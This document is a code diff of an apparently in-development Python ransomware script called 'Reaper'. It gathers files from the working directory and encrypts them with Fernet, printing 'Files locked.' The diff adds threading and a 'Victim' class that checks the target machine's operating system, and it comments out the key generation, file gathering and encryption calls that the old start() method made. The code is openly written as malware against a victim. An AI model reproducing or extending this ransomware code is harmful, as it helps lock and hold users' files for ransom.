@@ -1,5 +1,7 @@
 import os
+from Victim import Victim
 from cryptography.fernet import Fernet
+from threading import Thread
 
 
 def generate_key():
@@ -11,7 +13,7 @@ def generate_key():
     return key
 
 
-class Reaper:
+class Reaper(Thread):
     targets = []
 
     def gather_targets(self, path=os.getcwd()):
@@ -40,16 +42,26 @@ class Reaper:
 
         print("Files locked.")
 
-    def start(self):
-        print("Generating key...")
-        key = generate_key()
+    def run(self):
+        # Get information regarding the target machine
+        victim = Victim()
 
-        print("Locating targets...")
-        self.gather_targets()
-        print(self.targets)
+        if victim.get_system() == "Windows":
+            print("Optimizing Reaper for Windows...")
+            # print("Locating targets...")
+            # self.gather_targets()
+            # print(self.targets)
 
-        print("Encrypting files...")
-        self.encrypt(key)
+        elif victim.get_system() == "Linux":
+            print("Optimizing Reaper for Linux")
+
+        # print("Generating key...")
+        # key = generate_key()
+
+
+
+        # print("Encrypting files...")
+        # self.encrypt(key)
 
 
 Reaper().start()
